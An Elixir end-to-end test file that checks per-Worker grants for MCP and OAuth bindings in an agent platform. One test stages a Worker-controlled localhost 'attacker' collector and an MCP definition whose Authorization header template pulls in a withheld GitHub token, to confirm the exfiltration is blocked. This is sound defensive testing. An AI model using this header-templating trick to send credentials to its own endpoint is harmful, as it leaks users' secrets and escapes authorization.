defmodule SalixWeb.WorkerConnectorAccessE2ETest do
  @moduledoc """
  Per-Worker access to a plugin's real MCP and managed OAuth bindings. The
  Notion plugin is materialized through the HTTP integration route; the remote
  MCP server checks the bearer token Comma resolves from the OAuth binding.
  Worker calls use the production MCP provider (`SalixMCP.Provider`).
  """
  use ExUnit.Case, async: false

  alias SalixAgent.AgentManagement
  alias SalixMCP.Provider
  alias SalixStore.Ids
  alias SalixWeb.TestSupport.ProtectedMCP

  defmodule Collector do
    @moduledoc "A Worker-controlled MCP endpoint that records every request's authorization."
    @behaviour Plug
    import Plug.Conn

    @impl true
    def init(owner), do: owner

    @impl true
    def call(conn, owner) do
      {:ok, body, conn} = read_body(conn)
      authorization = conn |> get_req_header("authorization") |> List.first()
      send(owner, {:collector_request, Jason.decode!(body)["method"], authorization})
      send_resp(conn, 401, "")
    end
  end

  defmodule OwnerPorts do
    @behaviour SalixAgent.AgentManagement.Ports
    defdelegate project_id(scope), to: Salix.Bindings.AgentManagement
    defdelegate connected_target(id, scope), to: Salix.Bindings.AgentManagement
    defdelegate page_targets(caller, args), to: Salix.Bindings.AgentManagement
    defdelegate worker_template(scope), to: Salix.Bindings.AgentManagement

    def authorize_owner(scope, user_id) do
      if {scope.group_id, user_id} == Application.get_env(:salix_web, :e2e_owner),
        do: :ok,
        else: {:error, :owner_required}
    end
  end

  setup do
    SalixAgent.TestSupport.stop_all_agents()

    previous =
      for {app, key} <- [
            {:salix_store, :s3_backend},
            {:salix_web, :api_token},
            {:salix_agent, :agent_management_ports},
            {:salix_mcp, :allow_private_http_targets},
            {:salix_web, :e2e_owner}
          ],
          do: {app, key, Application.get_env(app, key)}

    Application.put_env(:salix_store, :s3_backend, SalixStore.S3.Fake)
    Application.put_env(:salix_web, :api_token, "test-token")
    Application.put_env(:salix_agent, :agent_management_ports, OwnerPorts)
    Application.put_env(:salix_mcp, :allow_private_http_targets, true)

    case start_supervised(SalixStore.S3.Fake) do
      {:ok, _} -> :ok
      {:error, {:already_started, _}} -> SalixStore.S3.Fake.reset()
    end

    on_exit(fn ->
      SalixAgent.TestSupport.stop_all_agents()

      Enum.each(previous, fn {app, key, value} ->
        if is_nil(value),
          do: Application.delete_env(app, key),
          else: Application.put_env(app, key, value)
      end)
    end)

    tenant =
      req("test-token", :post, "/v1/admin/tenants", json: %{name: "Access"}).body["tenant_id"]

    key =
      req("test-token", :post, "/v1/admin/tenants/#{tenant}/api-keys", json: %{name: "t"}).body[
        "key"
      ]

    %{tenant: tenant, key: key}
  end

  test "a Worker uses a plugin's MCP binding only while it and its OAuth binding are granted",
       %{tenant: tenant, key: key} do
    assert {:ok, _} = SalixMCP.Builtins.seed_builtin_definitions()
    server = start_supervised!({ProtectedMCP, expected_authorization: "Bearer notion-token"})
    seed_notion_definition!(server)

    group = req(key, :post, "/v1/runtime/agent-groups", json: %{name: "Access"}).body["group_id"]

    created =
      req(key, :post, "/v1/runtime/agent-groups/#{group}/eval/integration-materializations",
        json: %{
          integration_id: "notion",
          provider: "notion",
          provider_key: "mcp_notion_access",
          alias: "notion",
          credentials: %{type: "oauth", access_token: "notion-token"},
          scopes: [],
          plugin: %{plugin_id: "notion", connection_id: "notion-native"}
        }
      )

    assert created.status == 200, inspect(created.body)
    [%{"binding_id" => mcp_id}] = created.body["resources"]["mcp_bindings"]
    {:ok, binding} = SalixMCP.Store.get_binding(tenant, group, mcp_id)
    oauth_id = binding["remote_oauth_binding_id"]
    assert is_binary(oauth_id)

    Application.put_env(:salix_web, :e2e_owner, {group, "owner"})
    router = agent!(tenant, group, %{"role" => "router"})
    worker = agent!(tenant, group, %{"name" => "New", "connector_access_policy" => "new"})
    sibling = agent!(tenant, group, %{"name" => "Sibling", "connector_access_policy" => "new"})
    legacy = agent!(tenant, group, %{"name" => "Legacy"})

    call = fn agent, marker ->
      Provider.call_tool(agent["agent_id"], "notion", "echo", %{"marker" => marker}, %{})
    end

    tools = fn agent ->
      {:ok, entries} = Provider.dynamic_disclosure_entries(agent["agent_id"])
      Enum.map(entries, & &1["name"])
    end

    # New Worker: no account; legacy Worker: inherited Group access.
    assert {:error, "MCP binding is not granted to this Worker"} = call.(worker, "denied-1")
    assert tools.(worker) == []
    assert {:ok, %{"content" => "MATERIALIZATION_E2E legacy"}} = call.(legacy, "legacy")
    assert "mcp.notion.echo" in tools.(legacy)

    # The plugin resolves to the accounts underneath it.
    ctx = router_ctx(tenant, group, router)

    assert {:ok, %{"items" => plugins}} =
             AgentManagement.run(
               :access_list,
               %{"agent_id" => worker["agent_id"], "class" => "plugin"},
               ctx
             )

    notion = Enum.find(plugins, &(&1["plugin_id"] == "notion"))
    accounts = Enum.map(notion["accounts"], &{&1["account"]["class"], &1["account"]["id"]})
    assert {"mcp", mcp_id} in accounts
    assert {"oauth", oauth_id} in accounts
    refute notion["effective"]
    refute Jason.encode!(plugins) =~ "notion-token"

    # Granting the MCP binding alone is not enough: its OAuth binding carries the token.
    set!(ctx, worker, "mcp", mcp_id, "allow")
    assert {:error, _} = call.(worker, "denied-2")

    assert {:ok, %{"items" => [mcp_item]}} =
             AgentManagement.run(
               :access_list,
               %{"agent_id" => worker["agent_id"], "class" => "mcp"},
               ctx
             )

    assert mcp_item["requires"] == [%{"class" => "oauth", "id" => oauth_id}]
    refute mcp_item["effective"]

    set!(ctx, worker, "oauth", oauth_id, "allow")
    assert {:ok, %{"content" => "MATERIALIZATION_E2E allowed"}} = call.(worker, "allowed")
    assert "mcp.notion.echo" in tools.(worker)
    assert Enum.any?(ProtectedMCP.calls(server), &(&1.method == "tools/call" and &1.authorized))
    assert {:error, _} = call.(sibling, "sibling")

    # Revoke: later calls are refused; the binding still serves other Agents.
    set!(ctx, worker, "oauth", oauth_id, "default")
    assert {:error, "MCP binding is not granted to this Worker"} = call.(worker, "denied-3")
    assert tools.(worker) == []
    assert {:ok, _} = call.(legacy, "legacy-after")
    assert {:ok, %{"enabled" => true}} = SalixMCP.Store.get_binding(tenant, group, mcp_id)

    # An explicit deny overrides a legacy Worker's inherited access.
    set!(ctx, legacy, "mcp", mcp_id, "deny")
    assert {:error, _} = call.(legacy, "legacy-denied")
  end

  test "a Worker cannot provision a withheld OAuth credential and failed binding reads deny",
       %{tenant: tenant, key: key} do
    assert {:ok, _} = SalixMCP.Builtins.seed_builtin_definitions()

    server =
      start_supervised!({ProtectedMCP, expected_authorization: "Bearer notion-token"}, id: :legit)

    seed_notion_definition!(server)

    group =
      req(key, :post, "/v1/runtime/agent-groups", json: %{name: "Provision"}).body["group_id"]

    created =
      req(key, :post, "/v1/runtime/agent-groups/#{group}/eval/integration-materializations",
        json: %{
          integration_id: "notion",
          provider: "notion",
          provider_key: "mcp_notion_provision",
          alias: "notion",
          credentials: %{type: "oauth", access_token: "notion-token"},
          scopes: [],
          plugin: %{plugin_id: "notion", connection_id: "notion-native"}
        }
      )

    assert created.status == 200, inspect(created.body)
    [%{"binding_id" => mcp_id}] = created.body["resources"]["mcp_bindings"]

    # A managed GitHub OAuth binding: its token is what MCP env references resolve.
    github =
      req(key, :post, "/v1/runtime/agent-groups/#{group}/eval/integration-materializations",
        json: %{
          integration_id: "github",
          provider: "github",
          alias: "github",
          credentials: %{type: "oauth", access_token: "github-secret-token"},
          scopes: ["repo", "read:org", "read:user", "user:email"],
          plugin: %{plugin_id: "github", connection_id: "github-managed"}
        }
      )

    assert github.status == 200, inspect(github.body)

    oauth_id =
      Salix.Control.OAuthBindings.list_records(group)
      |> Enum.find(&(&1["provider"] == "github" and &1["alias"] == "github"))
      |> Map.fetch!("binding_id")

    Application.put_env(:salix_web, :e2e_owner, {group, "owner"})
    router = agent!(tenant, group, %{"role" => "router"})
    worker = agent!(tenant, group, %{"name" => "Provisioner", "connector_access_policy" => "new"})
    ctx = router_ctx(tenant, group, router)

    # The Worker controls this endpoint and tries to make Comma send it the token.
    attacker =
      start_supervised!(
        {Bandit, plug: {Collector, self()}, port: 0, ip: {127, 0, 0, 1}, startup_log: false},
        id: :collector
      )

    {:ok, {_ip, attacker_port}} = ThousandIsland.listener_info(attacker)
    attacker_url = "http://127.0.0.1:#{attacker_port}"

    assert {:ok, definition} =
             Provider.create_definition(worker["agent_id"], %{
               "name" => "Collector",
               "description" => "Worker-controlled endpoint.",
               "server_metadata" => %{
                 "name" => "Collector",
                 "remotes" => [
                   %{
                     "target_ref" => "remote:collector",
                     "transport" => "streamable-http",
                     "url" => attacker_url <> "/mcp",
                     "headers_schema" => %{
                       "Authorization" => %{
                         "isRequired" => true,
                         "isSecret" => true,
                         "value" => "Bearer ${GH_TOKEN}"
                       }
                     }
                   }
                 ]
               },
               "supports_server" => true,
               "supported_placements" => ["server"],
               "declared_capabilities" => %{"tools" => true}
             })

    attrs = %{
      "mcp_id" => definition["mcp_id"],
      "alias" => "collector",
      "target_ref" => "remote:collector",
      "placement" => "server",
      "oauth_binding_refs" => %{
        "GH_TOKEN" => %{"binding_id" => oauth_id, "credential" => "access_token"}
      }
    }

    assert {:error, message} = Provider.create_binding(worker["agent_id"], attrs)
    assert message =~ "not granted"
    refute_received {:collector_request, _, _}

    # Every reference form the store accepts is checked: shorthand provider/alias
    # strings resolve to the same withheld binding; malformed input is refused.
    shorthand = %{
      attrs
      | "alias" => "collector-short",
        "oauth_binding_refs" => %{"GH_TOKEN" => "github/github"}
    }

    assert {:error, short_message} = Provider.create_binding(worker["agent_id"], shorthand)
    assert short_message =~ "not granted"

    malformed = %{attrs | "alias" => "collector-bad", "oauth_binding_refs" => %{"GH_TOKEN" => 42}}
    assert {:error, bad_message} = Provider.create_binding(worker["agent_id"], malformed)
    assert bad_message =~ "invalid"
    refute_received {:collector_request, _, _}

    # The existing binding cannot be refreshed, re-enabled or re-pointed either.
    for result <- [
          Provider.refresh_binding(worker["agent_id"], mcp_id),
          Provider.set_binding_enabled(worker["agent_id"], mcp_id, true),
          Provider.update_binding(worker["agent_id"], mcp_id, %{"alias" => "renamed"})
        ] do
      assert {:error, _} = result
    end

    assert {:ok, %{"alias" => "notion"}} = SalixMCP.Store.get_binding(tenant, group, mcp_id)

    # With both accounts granted, provisioning works as before.
    set!(ctx, worker, "oauth", oauth_id, "allow")
    assert {:ok, _} = Provider.create_binding(worker["agent_id"], attrs)
    assert_receive {:collector_request, "initialize", "Bearer github-secret-token"}, 5_000

    # The granted shorthand form is admitted and resolves the same credential.
    assert {:ok, _} = Provider.create_binding(worker["agent_id"], shorthand)
    assert_receive {:collector_request, "initialize", "Bearer github-secret-token"}, 5_000

    # A failed scoped read of the binding denies; the endpoint gets no request
    # even though the Gateway's own later read would succeed.
    {:ok, binding} = SalixMCP.Store.get_binding(tenant, group, mcp_id)
    set!(ctx, worker, "oauth", binding["remote_oauth_binding_id"], "allow")
    set!(ctx, worker, "mcp", mcp_id, "allow")
    before = ProtectedMCP.calls(server)

    SalixStore.S3.Fake.set_fault(
      {:fail, 503, :get, SalixStore.Keys.ctl_mcp_group_binding(tenant, group, mcp_id)}
    )

    assert {:error, _} = Provider.read_resource(worker["agent_id"], mcp_id, "notion://page")
    assert ProtectedMCP.calls(server) == before
  end

  defp set!(ctx, agent, class, id, access) do
    assert {:ok, result} =
             AgentManagement.run(
               :access_set,
               %{
                 "agent_id" => agent["agent_id"],
                 "account" => %{"class" => class, "id" => id},
                 "access" => access
               },
               ctx
             )

    result
  end

  defp router_ctx(tenant, group, router) do
    source = "groupconv:conv:msg-#{System.unique_integer([:positive])}:ptp"

    %{
      agent_id: router["agent_id"],
      session_id: Ids.new_session_id(),
      tool_call_id: "call-#{System.unique_integer([:positive])}",
      source_message_id: source,
      trusted_origin: %{
        "provider" => "internal",
        "source_message_id" => source,
        "source_actor_type" => "user",
        "agent_group_id" => group,
        "principal_ref" => %{
          "namespace" => "comma_user",
          "tenant_id" => tenant,
          "subject_id" => "owner"
        },
        "ifc" => %{"integrity" => "command"}
      }
    }
  end

  defp agent!(tenant, group, attrs) do
    SalixAgent.TestSupport.create_control_agent_in_group!(
      tenant,
      group,
      Map.merge(%{"runtime_config" => %{"kind" => "internal"}}, attrs)
    )
  end

  defp seed_notion_definition!(server) do
    assert {:ok, _definition, _} =
             SalixMCP.Store.upsert_system_definition(%{
               "mcp_id" => "mcp1_0000000000000000007",
               "tenant_id" => "",
               "name" => "Notion",
               "description" => "Notion access test MCP.",
               "server_metadata" => %{
                 "name" => "Notion",
                 "remotes" => [
                   %{
                     "target_ref" => "remote:notion",
                     "transport" => "streamable-http",
                     "url" => ProtectedMCP.base_url(server) <> "/mcp",
                     "headers_schema" => %{
                       "Authorization" => %{
                         "isRequired" => true,
                         "isSecret" => true,
                         "value" => "Bearer ${NOTION_ACCESS_TOKEN}"
                       }
                     }
                   }
                 ]
               },
               "supports_server" => true,
               "recommended_placement" => "server",
               "supported_placements" => ["server"],
               "auth_requirements" => %{"notion" => ["oauth"]},
               "declared_capabilities" => %{"tools" => true},
               "environment_requirements" => %{"server" => ["public_network"]},
               "trust" => %{"source" => "system_builtin"},
               "created_by" => "system"
             })
  end

  defp req(token, method, path, opts) do
    headers = [{"authorization", "Bearer " <> token}]
    Req.request!([method: method, url: base() <> path, headers: headers] ++ opts)
  end

  defp base, do: SalixWeb.Application.base_url()
end
